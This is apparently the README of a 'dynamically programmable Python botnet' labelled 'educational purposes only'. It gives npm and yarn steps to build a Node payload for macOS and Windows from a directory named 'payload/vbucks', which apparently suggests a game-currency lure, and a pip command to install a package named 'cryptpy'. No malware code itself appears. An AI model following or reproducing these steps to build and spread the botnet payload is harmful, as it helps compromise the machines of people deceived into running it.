Dynamically programmable Python botnet (educational purposes only).

## Installation

### Building the Node Source

First, `cd payload/vbucks`.

Build for MacOS:
1. `npm i`<br>
2. `yarn dist`

Build for Windows:
1. `npm i`<br>
2. `npm run dist`

### Installing the Python Source via Pip

```BASH
pip install cryptpy
```
